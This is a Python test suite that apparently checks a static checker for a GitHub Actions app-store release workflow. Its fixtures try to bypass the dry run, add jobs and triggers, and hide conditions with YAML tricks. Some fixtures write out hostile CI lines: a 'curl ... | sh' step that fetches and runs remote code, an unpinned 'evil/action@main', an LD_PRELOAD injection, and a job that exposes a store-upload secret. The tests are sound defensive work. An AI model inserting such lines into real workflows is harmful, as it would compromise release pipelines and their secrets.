            (STORE, "          MAY_DRY_RUN: ${{ github.event.inputs.dry_run }}\n        run: python3 -I -S -B tools/may_release/gate.py --action \"$MAY_PLATFORM\"",
             "        run: python3 -I -S -B tools/may_release/gate.py --action \"$MAY_PLATFORM\"",
             "store admission: does not pass the dispatch's dry_run to the gate"),
            (STORE, "          MAY_DRY_RUN: ${{ github.event.inputs.dry_run }}\n        run: python3 -I -S -B tools/may_release/gate.py --action \"$MAY_PLATFORM\"",
             "          MAY_DRY_RUN: 'true'\n        run: python3 -I -S -B tools/may_release/gate.py --action \"$MAY_PLATFORM\"",
             "store admission: does not pass the dispatch's dry_run to the gate"),
            ("tools/may_release/gate.py", 'UPLOADS_HELD = {"ios"}', 'UPLOADS_HELD = {"android", "ios"}',
             "gate.py: UPLOADS_HELD is not exactly the platforms whose upload is held"),
            ("tools/may_release/gate.py", 'UPLOADS_HELD = {"ios"}', 'UPLOADS_HELD = set()',
             "gate.py: UPLOADS_HELD is not exactly the platforms whose upload is held"),
            ("tools/may_release/gate.py", 'UPLOADS_HELD = {"ios"}', 'UPLOADS_HELD = set(["ios"])',
             "gate.py: UPLOADS_HELD is not exactly the platforms whose upload is held"),
            ("tools/may_release/gate.py", 'UPLOADS_HELD = {"ios"}', 'UPLOADS_HELD = {"ios", "web"}',
             "gate.py: UPLOADS_HELD is not exactly the platforms whose upload is held"),
        )
        for relative, old, new, expected in cases:
            with self.subTest(new=new.strip()[:50]):
                self.fresh()
                self.mutate(relative, old, new)
                self.assertFlagged(expected)

    def test_only_the_handoff_download_may_continue_on_error(self):
        for job, old in (("android-release", "      - name: Check the checkout is exactly its commit before signing\n"),
                         ("ios-build", "      - name: Build unsigned iOS archive without secrets\n")):
            with self.subTest(job=job):
                self.fresh()
                self.mutate(STORE, old, old + "        continue-on-error: true\n")
                self.assertFlagged("store " + job + ": a step other than the handoff download may fail")
        self.fresh()
        self.mutate(STORE, "    timeout-minutes: 30\n", "    timeout-minutes: 30\n    continue-on-error: true\n")
        self.assertFlagged("store android-release: a step other than the handoff download may fail")

    def test_yaml_spellings_github_reads_differently_are_refused(self):
        # Each is valid YAML that GitHub reads as a key or value the line rules would miss.
        gate, sign = "      - id: gate\n", "      - name: Sign and verify Android App Bundle\n"
        integrity = "      - name: Check the checkout is exactly its commit before decrypting\n"
        hidden = ("        if: ${{ " + INERT + " && github.event.inputs.dry_run == 'false' }}\n")
        cases = (
            (gate, gate + '        "continue-on-error": true\n'),
            (gate, gate + "        'if': false\n"),
            (gate, gate + "        if : false\n"),
            (gate, gate + "        ? if\n        : false\n"),
            (gate, gate + "        continue-on-error : true\n"),
            ("  admission:\n", "  admission:\n    \"if\": false\n"),
            (sign, sign + '        "if": false\n'),
            (integrity, integrity + "        if : false\n"),
            (integrity, "      - name: x\n        \"run\": curl -s https://example.invalid | sh\n" + integrity),
            (integrity, "      - \"uses\": evil/action@main\n" + integrity),
            (integrity, "      - uses : evil/action@main\n" + integrity),
            (sign, sign + "        env :\n          LD_PRELOAD: /tmp/x.so\n"),
            # The guard kept only inside a multi-line quoted scalar: the upload has no if:.
            (UPLOAD_LINE, "        id: \"upload\n" + hidden + "        \"\n"),
            ("    if: ${{ " + INERT + " && inputs.platform == 'ios' }}\n    runs-on: macos-15\n",
             "    name: \"ios build\n    if: ${{ " + INERT + " && inputs.platform == 'ios' }}\n    \"\n    runs-on: macos-15\n"),
            (UPLOAD_LINE, "        if: &held ${{ " + INERT + " && github.event.inputs.dry_run == 'false' }}\n"),
            ("permissions:\n  contents: read\nconcurrency:", "permissions:\n  contents: read\nrun-name: x\nconcurrency:"),
        )
        for old, new in cases:
            with self.subTest(new=new.strip()[:60]):
                self.fresh()
                self.mutate(STORE, old, new)
                if "run-name" in new:
                    self.assertFlagged("top-level keys are not exactly name, on, permissions, concurrency, jobs")
                else:
                    self.assertLayoutFlagged()

    def assertLayoutFlagged(self):
        self.assertFlagged(": is not a plain one-line `key: value` in this repository's layout")

    # One test per main layout rule, so each broken-build control has a single target.
    def test_quoted_if_key_is_refused(self):
        for old, new in (("  admission:\n", "  admission:\n    \"if\": false\n"),
                         ("      - name: Sign and verify Android App Bundle\n",
                          "      - name: Sign and verify Android App Bundle\n        \"if\": false\n")):
            with self.subTest(new=new.strip()[:40]):
                self.fresh()
                self.mutate(STORE, old, new)
                self.assertLayoutFlagged()

    def test_spaced_continue_on_error_key_on_admission_is_refused(self):
        self.mutate(STORE, "      - id: gate\n", "      - id: gate\n        continue-on-error : true\n")
        self.assertLayoutFlagged()

    def test_quoted_uses_key_with_an_unpinned_action_is_refused(self):
        self.mutate(STORE, "      - name: Check the checkout is exactly its commit before decrypting\n",
                    "      - \"uses\": evil/action@main\n"
                    "      - name: Check the checkout is exactly its commit before decrypting\n")
        self.assertLayoutFlagged()

    def test_multiline_quoted_id_cannot_hide_an_if(self):
        # GitHub reads one id "play_upload if: ... note: end" and an unconditional
        # upload, which would run on a dry run; the line rules alone would read the if:.
        self.mutate(STORE, "        id: play_upload\n" + ANDROID_LINE,
                    '        id: "play_upload\n' + ANDROID_LINE + '        note: end"\n')
        self.assertLayoutFlagged()
        self.fresh()
        self.mutate(STORE, UPLOAD_LINE, '        note: "held\n' + UPLOAD_LINE + '        end"\n')
        self.assertLayoutFlagged()

    def test_extra_job_is_refused(self):
        extra = ("  android-publish:\n    needs: [admission, android-release]\n    if: ${{ inputs.platform == 'android' }}\n"
                 "    runs-on: ubuntu-24.04\n    environment: ${{ needs.admission.outputs.environment }}\n    steps:\n"
                 "      - name: Publish\n        env:\n          MAY_DRY_RUN: 'false'\n"
                 "          MAY_PLAY_JSON: ${{ secrets.MAY_PLAY_JSON }}\n"
                 "        run: python3 -I -S -B tools/may_release/play_upload.py --target \"$MAY_TARGET\"\n")
        self.mutate(STORE, "  ios-build:\n", extra + "  ios-build:\n")
        self.assertFlagged("jobs are not exactly the ones stage 2 pins")

    def test_extra_trigger_is_refused(self):
        for trigger in ("  push:\n", "  pull_request:\n", "  workflow_call:\n"):
            with self.subTest(trigger=trigger.strip()):
                self.fresh()
                self.mutate(STORE, "on:\n  workflow_dispatch:\n", "on:\n" + trigger + "  workflow_dispatch:\n")
                self.assertFlagged("is triggered by something other than workflow_dispatch")

    def test_admission_outputs_cannot_be_hardcoded(self):
        for old, new in (("      environment: ${{ steps.gate.outputs.environment }}\n", "      environment: may-android-internal\n"),
                         ("      build_environment: ${{ steps.gate.outputs.build_environment }}\n",
                          "      build_environment: may-native-compile\n")):
            with self.subTest(new=new.strip()):
                self.fresh()
                self.mutate(STORE, old, new)
                self.assertFlagged("store admission: its actions, env or outputs are not exactly the gate's")

    def test_store_workflow_has_exactly_its_jobs_and_trigger(self):
        extra = ("  android-publish:\n    needs: [admission, android-release]\n    if: ${{ inputs.platform == 'android' }}\n"
                 "    runs-on: ubuntu-24.04\n    environment: ${{ needs.admission.outputs.environment }}\n    steps:\n"
                 "      - name: Publish\n        env:\n          MAY_DRY_RUN: 'false'\n"
                 "          MAY_PLAY_JSON: ${{ secrets.MAY_PLAY_JSON }}\n"
                 "        run: python3 -I -S -B tools/may_release/play_upload.py --target \"$MAY_TARGET\"\n")
        self.mutate(STORE, "  ios-build:\n", extra + "  ios-build:\n")
        self.assertFlagged("jobs are not exactly the ones stage 2 pins")
        for trigger in ("  push:\n", "  pull_request:\n", "  workflow_call:\n"):
            with self.subTest(trigger=trigger.strip()):
                self.fresh()
                self.mutate(STORE, "on:\n  workflow_dispatch:\n", "on:\n" + trigger + "  workflow_dispatch:\n")
                self.assertFlagged("is triggered by something other than workflow_dispatch")

    def test_admission_actions_env_and_outputs_are_pinned(self):
        dry = "          MAY_DRY_RUN: ${{ github.event.inputs.dry_run }}\n"
        for old, new in (("      - id: gate\n", "      - uses: someone/action@" + "a" * 40 + "\n      - id: gate\n"),
                         (dry, dry + "          GITHUB_REF: refs/heads/main\n"),
                         (dry, dry + "          MAY_X: ${{ github.token }}\n"),
                         ("      - id: gate\n", "      - id: gatex\n"),
                         ("      environment: ${{ steps.gate.outputs.environment }}\n",
                          "      environment: may-android-internal\n")):
            with self.subTest(new=new.strip()[:60]):
                self.fresh()
                self.mutate(STORE, old, new)
                self.assertFlagged("store admission: its actions, env or outputs are not exactly the gate's")

    def test_dry_run_input_must_be_a_boolean_defaulting_to_true(self):
        for old, new in (("        type: boolean\n        default: true\n", "        type: boolean\n        default: false\n"),
                         ("        type: boolean\n        default: true\n", "        type: boolean\n"),
                         ("        type: boolean\n        default: true\n", "        type: string\n        default: true\n"),
                         ("      dry_run:\n", "      dry_run_disabled:\n")):
            with self.subTest(new=new.strip()):
                self.fresh()
                self.mutate(STORE, old, new)
                self.assertFlagged("dry_run is not a required boolean input defaulting to true")

    def test_dry_run_never_reaches_a_store_upload(self):
        held = "        if: ${{ " + INERT + " && "
        for job, upload_if in (("android-release", ANDROID_LINE), ("ios-release", UPLOAD_LINE)):
            cases = (
                (upload_if, ""),
                (upload_if, held + "github.event.inputs.dry_run != 'true' }}\n"),
                (upload_if, held + "!inputs.dry_run }}\n"),
                (upload_if, "        if: ${{ github.event.inputs.dry_run != 'true' }}\n"),
                (upload_if, "        if: ${{ !inputs.dry_run }}\n"),
                (upload_if, "        if: always()\n"),
                ("          MAY_DRY_RUN: ${{ github.event.inputs.dry_run }}\n", ""),
                ("          MAY_DRY_RUN: ${{ github.event.inputs.dry_run }}\n", "          MAY_DRY_RUN: 'false'\n"),
            )
            for old, new in cases:
                with self.subTest(job=job, new=new.strip()):
                    self.fresh()
                    # The first occurrence within the job (admission also passes MAY_DRY_RUN).
                    path = self.root / STORE
                    text = path.read_text()
                    at = text.find(old, text.find("  " + job + ":\n"))
                    self.assertGreaterEqual(at, 0)
                    path.write_text(text[:at] + new + text[at + len(old):])
                    found = static_check.problems(self.root)
                    self.assertTrue(any(p.startswith("store " + job) for p in found), found)

    def test_dry_run_still_signs_and_reports(self):
        cases = (
            ("        run: python3 -I -S -B tools/may_release/sign.py --platform android",
             "        if: ${{ github.event.inputs.dry_run == 'false' }}\n"
             "        run: python3 -I -S -B tools/may_release/sign.py --platform android",
             "store android-release: a step other than the upload or dry-run report is conditional"),
            ("        run: python3 -I -S -B tools/may_release/handoff.py open --platform ios",
             "        if: ${{ github.event.inputs.dry_run == 'false' }}\n"
             "        run: python3 -I -S -B tools/may_release/handoff.py open --platform ios",
             "store ios-release: a step other than the upload or dry-run report is conditional"),
            ("        run: python3 -I -S -B tools/may_release/store.py --platform android",
             "        if: ${{ github.event.inputs.dry_run == 'false' }}\n"
             "        run: python3 -I -S -B tools/may_release/store.py --platform android",
             "store android-build: a step other than the upload or dry-run report is conditional"),
            ("        if: ${{ github.event.inputs.dry_run != 'false' }}\n"
             "        run: python3 -I -S -B tools/may_release/dry_run.py --platform android",
             "        if: ${{ github.event.inputs.dry_run == 'true' }}\n"
             "        run: python3 -I -S -B tools/may_release/dry_run.py --platform android",
             "store android-release: the dry run does not report what it would have uploaded"),
            ("tools/may_release/dry_run.py --platform ios", "tools/may_release/dry_run.py --platform android",
             "store ios-release: the dry run does not report what it would have uploaded"),
            ("      - name: Report what the dry run would have uploaded\n", "      - name: Report something\n",
             "store android-release: its steps are missing or out of order"),
        )
        for old, new, expected in cases:
            with self.subTest(expected=expected):
                self.fresh()
                self.mutate(STORE, old, new)
                self.assertFlagged(expected)

    def test_each_build_prepares_its_own_platform_and_target(self):
        for old, new, job in (
                ("prepare.py --platform android --target", "prepare.py --platform ios --target", "android-build"),
                ('prepare.py --platform ios --target "$MAY_TARGET"', 'prepare.py --platform ios --target playground',
                 "ios-build"),
                ('prepare.py --platform ios --target "$MAY_TARGET" ', "prepare.py ", "ios-build")):
            with self.subTest(new=new):
                self.fresh()
                self.mutate(STORE, old, new)
                self.assertFlagged("store " + job + ": does not prepare the design system for its own platform")

    def test_protected_job_must_wait_for_admission(self):
        self.mutate(STORE, "  android-build:\n    needs: admission\n", "  android-build:\n")
        self.assertFlagged("protected job android-build does not wait for admission")


if __name__ == "__main__":
    unittest.main()
